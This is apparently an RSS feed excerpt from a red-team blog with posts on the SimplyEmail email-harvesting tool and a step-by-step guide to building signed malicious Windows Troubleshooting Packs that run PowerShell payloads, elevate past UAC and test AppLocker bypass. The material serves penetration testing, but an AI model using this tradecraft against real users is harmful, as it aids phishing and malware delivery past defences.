&lt;p&gt;Suppersingly enough this wasn’t as hard as I thought it was going to be! Mainly since the method I use to handle all the background work has been handled for me!&lt;/p&gt;

&lt;p&gt;Expect to see upcoming this month:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Excel Parsing&lt;/li&gt;
&lt;li&gt;Doc / Docx Parsing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As always you can check out the code here: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Modules/GooglePDFSearch.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Modules/GooglePDFSearch.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sample Output and test using the new Verbose options:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    root@vapt-kali:~/Desktop/SimplyEmail# ./SimplyEmail.py -t GooglePDF -e mandiant.com -v
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.22.37-PM.png&#34;&gt;&lt;img src=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.22.37-PM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 1.22.37 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Harvesting with SimplyEmail</title>
      <link>https://cybersyndicates.com/2015/11/email-harvesting-with-simplyemail/</link>
      <pubDate>Sat, 21 Nov 2015 14:58:47 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2015/11/email-harvesting-with-simplyemail/</guid>
      <description>

&lt;h2 id=&#34;email-recon-made-easy&#34;&gt;Email Recon Made Easy&lt;/h2&gt;

&lt;p&gt;More often than not email enumeration is hit or miss, depending on the sources used throttle limits are in place or they just plain don’t index everything. As you may know from my past blog write-up I wrote a HTML scrapper to integrate into theHarvester. After that experience I knew there was for some improvement on 3 major key areas:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Speed - It needed to be able to handle way more locations to search&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Framework – People needed to be able to easily contribute to the project&lt;/li&gt;
&lt;li&gt;Reporting – I wanted it to be elegant and easy to discover the sources&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With these requirements in hand I started my build on SimplyEmail!&lt;/p&gt;

&lt;p&gt;TL;DR:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyEmail&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h3 id=&#34;benefits-of-simplyemail&#34;&gt;Benefits of SimplyEmail&lt;/h3&gt;

&lt;p&gt;In the underlying code I built the program to dynamically load the all modules that where placed in the modules folder. The question is why? Well after using other tools and methods, I found that searching just about anywhere you can get your hands on can be beneficial to the results you obtain (Even if duplicates). In certain cases, Google Captcha block would engage and Yahoo Search would come to save the day! The key here was the ability to run multiple modules at the same time, this proved to be quite an improvement for web intense modules. Here is a small snippet of the code that makes this happen:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;All modules are dynamicaly loaded into a list&lt;/li&gt;
&lt;li&gt;Modules are placed into a Multiprocessing queue&lt;/li&gt;
&lt;li&gt;Execution takes place in a standardized format so that all processing takes place on child process rather than parent&lt;/li&gt;
&lt;li&gt;Results are Parsed with a custom parser that handles about all the raw html and text based parsing you could need.&lt;/li&gt;
&lt;li&gt;These results are placed into a Dictionary with a Key of the source and email address&lt;/li&gt;
&lt;li&gt;Html results are generated on the fly, and raw results are appended to a running list with time stamps.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;TL;DR:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyEmail&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Multiprocessing Controller:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.36.26-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.36.26-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 9.36.26 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How the modules are instantiated:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.38.55-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.38.55-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 9.38.55 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;simple-cli-interface&#34;&gt;Simple CLI Interface:&lt;/h3&gt;

&lt;p&gt;To get started always run the Setup script first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/SimplyEmail# sh Setup.sh
or
root@kali:~/Desktop/SimplyEmail# ./Setup.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next take a look at the help menu:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/SimplyEmail# ./SimplyEmail -h
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.50.39-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-9.50.39-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 9.50.39 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running the tool can be accomplished by either running all modules or one specific module for testing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/Desktop/SimplyEmail# ./SimplyEmail -all -e enron.com

root@kali:~/Desktop/SimplyEmail# ./SimplyEmail -t Google -e enron.com
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-10.03.13-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-17-at-10.03.13-AM.png&#34; alt=&#34;Screen Shot 2015-11-17 at 10.03.13 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;understanding-reporting-options&#34;&gt;Understanding Reporting Options:&lt;/h2&gt;

&lt;p&gt;One of the most frustrating aspects of Pen-testing is the tools&amp;rsquo; ability to report the findings and make those easily readable. This may be for the data provided to a customer or just the ability to report on source of the data.&lt;/p&gt;

&lt;p&gt;So I&amp;rsquo;m making it my goal for my tools to take that work off your back and make it as simple as possible! Let&amp;rsquo;s cover the two different reports generated.&lt;/p&gt;

&lt;h3 id=&#34;text-output&#34;&gt;Text Output:&lt;/h3&gt;

&lt;p&gt;With this option results are generated and appended to a running text file called Email_List.txt. this makes it easy to find past searches or export to tool of choice. Example:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-21-at-10.01.52-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-21-at-10.01.52-AM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 10.01.52 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;html-output&#34;&gt;HTML Output:&lt;/h3&gt;

&lt;p&gt;As I mentioned before a powerful function that I wanted to integrate was the ability to produce a visually appealing and rich report for the user and potentially something that could be part of data provided to a client. Please let me know with suggestions!&lt;/p&gt;

&lt;h4 id=&#34;email-source&#34;&gt;Email Source:&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-11-at-5.27.15-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-11-at-5.27.15-PM.png&#34; alt=&#34;Screen Shot 2015-11-11 at 5.27.15 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;email-section&#34;&gt;Email Section:&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Html report now shows Alerts for Canary Search Results&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-11-at-5.27.31-PM.png&#34; alt=&#34;![Screen Shot 2015-11-11 at 5.27.31 PM](/wp-content/Screen-Shot-2015-11-11-at-5.27.31-PM-1024x528.png)&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>A No Bull Guide to Malicious Windows Trouble Shooting Packs and Application whitelist Bypass</title>
      <link>https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</link>
      <pubDate>Fri, 16 Oct 2015 13:36:50 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</guid>
      <description>

&lt;h3 id=&#34;malicious-windows-trouble-shooting-package&#34;&gt;Malicious Windows Trouble Shooting Package&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Using Nicholas Berthaume Recent work on WTP:&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;a href=&#34;https://twitter.com/nberthaume&#34;&gt;@nberthaume&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Just some background on this before we deep dive into setup and construction of the package. I was let onto this a few months back from a coworker. I know this was a pretty cool concept and could see the real world benefit of using something like this on a Red Team in a high security environment. Especially on the phishing side of the house, which I have been doing way more of lately!&lt;/p&gt;

&lt;p&gt;But at the time I only knew that this could be done for malicious use, it does turn out that their was a talk explaining just about everything we are going to cover except a few things. The key here is all the information I gathered and the step-by-step execution was done by research on my own and just trial and error to see how things worked. This is an import aspect of anything in the Red Team space, it requires the knowledge of what you are throwing into a customers environment as well as understanding what type effects its has on the endpoint to truly own your tradecraft. Upon entry into this space everyone is challenged at some point, questions like what command are you running; why?; do you know what that does?; what process will be spawned vs injecting.&lt;/p&gt;

&lt;p&gt;Thats why I took the approach to doing all the research before reaching out to the team for info on where the idea was generated. It seemed to pay off :)&lt;/p&gt;

&lt;h3 id=&#34;ligt-functionality-windows-feature&#34;&gt;Ligt Functionality  (Windows &amp;ldquo;Feature&amp;rdquo;)&lt;/h3&gt;

&lt;p&gt;So what are WTP (Windows Trouble Shooting Packs)? The question is simple to answer: its a simple package software developers can check issues, that could be causing issues with their software. This WTP is mainly used by Microsoft and most of us have used them and maybe just didn&amp;rsquo;t think about it (Troubleshooting Network Issues). I&amp;rsquo;m sure we all have seen this before:&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-09-at-2.36.47-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-09-at-2.36.47-PM.png&#34; alt=&#34;Screen Shot 2015-10-09 at 2.36.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Microsofts &lt;em&gt;Signed&lt;/em&gt; Binary Involved (Note this):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msdt &amp;lt;/id &amp;lt;name&amp;gt; | /path &amp;lt;name&amp;gt; | /cab &amp;lt; name&amp;gt;&amp;gt; &amp;lt;&amp;lt;/parameter&amp;gt; [options] … &amp;lt;parameter&amp;gt; [options]&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some really cool features of msdt:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Is a standard windows signed binary and standard with all deployments&lt;/li&gt;
&lt;li&gt;Allows you to specify paths of the package and even use UNC paths!!!&lt;/li&gt;
&lt;li&gt;Allows for you to use the flag &amp;ldquo;/af&amp;rdquo; to produce a Answers file built in XML to automate the WTP and can also run from a UNC path &amp;ldquo;Potential Lateral Movement&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Answer files can be easily built in Power-shell&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;what-does-the-package-consist-of&#34;&gt;What does the Package consist of?&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/IC306717.jpg&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/IC306717.jpg&#34; alt=&#34;IC306717&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So I stole this image from MSDN and its a great image to understand the basics of a WTP. A few things we need to understand about the package it self. The WTP structure consist of:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Id Metadata&lt;/li&gt;
&lt;li&gt;Detection scripts&lt;/li&gt;
&lt;li&gt;Resolution scripts&lt;/li&gt;
&lt;li&gt;Verification scripts&lt;/li&gt;
&lt;li&gt;Localized scripts&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This format is what builds the &amp;ldquo;Windows Troubleshooting Pack&amp;rdquo; itself , this is what is given to the Runtime Engine and runs through these and display to the user the results of the package. The bottom line is we really don&amp;rsquo;t need all of these scripts unless you will be weaponizing these for a specific phishing campaign that is unique the environment you will be targeting. The cool part is you can basically use this package to deploy just about any code you can dream of, as long as you can some how deploy it with powershell of course.&lt;/p&gt;

&lt;h3 id=&#34;how-to-setup-to-build-your-first-wtp&#34;&gt;How to setup to build your first WTP&lt;/h3&gt;

&lt;p&gt;Lets now cover what we will need to build your first WTP. This can be tricky so follow this to the exact step so you won&amp;rsquo;t encounter any crazy errors as this wasn&amp;rsquo;t easy to figure out. I did use VMware and a clean windows 7 pro VM, so I can&amp;rsquo;t speak for any other platform. But the trick here is that you can build this packages manually which will take FOREVER or use windows SDK package manger to build them.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Build your VM that is fully patched and latest SP&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We need to install windows specific visual studio and C++ distribution&lt;/p&gt;

&lt;p&gt;YOU MUST USE 2010 Visual Studio&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://microsoft-visual-cpp-express.soft32.com/free-download/&#34;&gt;Link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Use the following selections&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.18-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.18-PM.png&#34; alt=&#34;Screen Shot 2015-10-14 at 9.56.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(Important packages you will be installing so we can install the SDK)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.57-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-9.56.57-PM.png&#34; alt=&#34;Screen Shot 2015-10-14 at 9.56.57 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt;
So no matter how hard I tired I couldn&amp;rsquo;t get the latest SDK to work so I jumped back to 7.0&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://www.microsoft.com/en-us/download/details.aspx?id=3138&#34;&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 5:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Check the following boxes so you ensure you install the complete package even though it installs .NET 3.5!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-10.06.00-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-14-at-10.06.00-PM.png&#34; alt=&#34;Screen Shot 2015-10-14 at 10.06.00 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Building your first WTP&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At this point you should be set up to use the TSPDesigner package that comes with windows SDK.  While this isn&amp;rsquo;t currently easily automated, Nicholas Berthaume talked about releasing a toolkit for linux to build these packages. We will cover some of the tradecraft concerns and case use&amp;rsquo;s in this post in a bit.&lt;/p&gt;

&lt;p&gt;Lets get started by starting up the designer and build out with the wizzard for a quick start.&lt;/p&gt;

&lt;blockquote&gt;Goto All Programs -&gt; Microsoft windows SDK v7.0 -&gt; Tools -&gt; Windows Troubleshooting Pack Designer&lt;/blockquote&gt;

&lt;p&gt;Click on create pack  -&amp;gt; name it &amp;ldquo;Really Bad Here&amp;rdquo; and click on create:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.34.40-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.34.40-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 6.34.40 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Go right ahead and fill out the package fields (*set URL it won&amp;rsquo;t have to match your code signing cert):&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.36.59-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-6.36.59-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 6.36.59 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we move forward lets take a quick look at an actually trouble shooting pack, so we have it fresh in our minds of how execution takes place. This structure can give us a great amount of information about where you may want inject your payload of choice. Head over to your kali and download this Microsoft signed Troubleshooting package, we will be unarchiving it in Kali 2.0:&lt;/p&gt;

&lt;p&gt;Download: &lt;a href=&#34;http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab&#34;&gt;Link&lt;/a&gt; or &lt;a href=&#34;http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab&#34;&gt;http://download.microsoft.com/download/F/2/2/F22D5FDB-59CD-4275-8C95-1BE17BF70B21/wushowhide.diagcab&lt;/a&gt; if you don&amp;rsquo;t trust me ;)&lt;/p&gt;

&lt;p&gt;Lets take a look at this package of what a potential victim would see if they unpacked it and compared, as you move forward with any tool or technique its important that you understand what right looks like and what your victim could possibly see if they had the right tools.&lt;/p&gt;

&lt;blockquote&gt;Right click on the .diagcab and select Open With Archive Manager, you should see:&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-7.09.07-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-7.09.07-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 7.09.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can simply open any package you build with a achieve manager, and see all the unique parts of the package that will be built with the WTP designer. The important concept here is to take a look around at the structure and get an idea of how you would like you package to be built. So as you can see we can easily pull out the unique PS scripts, we may want to obfuscated using some simple power-shell techniques (ex. Encoded base64).&lt;/p&gt;

&lt;p&gt;Lets move onto finishing the setup, and fill in the following. This data will be displayed when the user checks the advanced results  within the package, so make it interesting:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.26.15-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.26.15-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.26.15 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next we will setup what will happen if we discover the root cause. A interesting discovery is the ability to run the package at a elevated level. This could be interesting, so lets select to run this at a elevated context! (This can Bypass UAC)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.29.49-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.29.49-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.29.49 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Set up the Resolver which won&amp;rsquo;t really do anything in our case so don&amp;rsquo;t set elevated privileges:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.31.48-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.31.48-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.31.48 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Using a verifier we can use some simple logic to insure the root cause is fixed.. (Endless possibilities to deploy your initial attack vector.).To keep it simple we won&amp;rsquo;t need to add a Verifier but you will see the logic as we move on:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.39.37-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.39.37-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.39.37 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now lets start by editing your Root Cause PS script to start up notepad.exe as an example. Select &amp;ldquo;Edit TroubleShooter Script&amp;rdquo;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.40.12-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.40.12-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.40.12 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;At this point your built in Power-shell IDE will be launched for simple editing of your logic:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.53.55-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-8.53.55-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 8.53.55 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you want to test out a payload its very simple to use CobaltStrikes Payload Generator to build a Staged PS script and just place that code in the logic section to gain code execution (Please note that this section does get executed twice for some reason). If you want to use CobaltStrikes DNS Hybrid listener you can build a fully Staged DNS beacon and export it as a PS script and place that code in the logic area as well.&lt;/p&gt;

&lt;p&gt;Go ahead and hit the save button, and your package is ready to be tested out. We will be starting out using a self signed package for testing and will sign the package in a bit. Remember that a self signed package won&amp;rsquo;t run on any computer other than the one you built it on. SO don&amp;rsquo;t try sending a self signed one out to a target!&lt;/p&gt;

&lt;blockquote&gt;Build -&gt; Build Pack -&gt; Ok -&gt; Yes -&gt; Launch Trouble Shooting Pack&lt;/blockquote&gt;

&lt;p&gt;You should imeidently have Notepad pop and you have code execution!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.04.14-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.04.14-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.04.14 PM&#34; /&gt;&lt;/a&gt;Now lets explore the detailed info that our target may see when they View Detailed information:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.05.30-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.05.30-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.05.30 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;setup-for-code-signing&#34;&gt;Setup for Code Signing&lt;/h3&gt;

&lt;p&gt;Get a code signing cert: &lt;a href=&#34;https://www.digicert.com/code-signing/&#34;&gt;Here&lt;/a&gt;  ($179 but you can find way cheaper)&lt;/p&gt;

&lt;p&gt;In my case I had a DigiCert Code Signing Cert, that was in a .P7B format which cannot be used with the WTP (Must have the secret key re-Attached to the cert to build a .PFX Cert. This can be a tricky step so I will cover how I generated my .PFX cert before we go into signing the package.&lt;/p&gt;

&lt;p&gt;Using Kali 2.0 built in OpenSSL package we can convert it to the correct format:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl pkcs7 -print_certs -in MyCodeSigningCert.p7b -out certificate.cer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using this new built .Cer we will now generate our .PFX using our privatekey.key.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl pkcs12 -export -out certificate.pfx -inkey privateKey.key -in certificate.crt -certfile CACert.crt
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;Return back to windows package designer -&gt; Project -&gt; Options -&gt; Specify a Certificate&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.21.46-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.21.46-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.21.46 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You should now be able to Build your package and now have a fully signed package for deployment. In the next image the publisher has been obfuscated so I don&amp;rsquo;t share the world with my cert. At this point its  time to move into testing of our new WTP!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.24.35-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.24.35-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.24.35 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;application-whitelisting-and-script-bypass-testing&#34;&gt;Application Whitelisting and Script Bypass Testing&lt;/h3&gt;

&lt;p&gt;Lets now setup a hardened environment on our fresh Windows 7 &lt;em&gt;Pro&lt;/em&gt; VM. Using windows Applocker we can easily setup a simulated environment that we can test against.&lt;/p&gt;

&lt;p&gt;Using windows Group Policy editor we can make the correct changes needed ( run Gpcedit.msc ):&lt;/p&gt;

&lt;p&gt;Navigate to: Computer Configuration \ Windows Settings \ Security Settings \ Application Control Policies \ AppLocker&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.37.47-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.37.47-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.37.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now we need click on &amp;ldquo;Configure rule enforcement&amp;rdquo; and enable Execution Rules and Script Rules:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.39.32-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.39.32-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.39.32 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next right click Executable Rules -&amp;gt; Create New Rule:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.42.25-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.42.25-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.42.25 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.02-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-10-15-at-9.43.02-PM.png&#34; alt=&#34;Screen Shot 2015-10-15 at 9.43.02 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

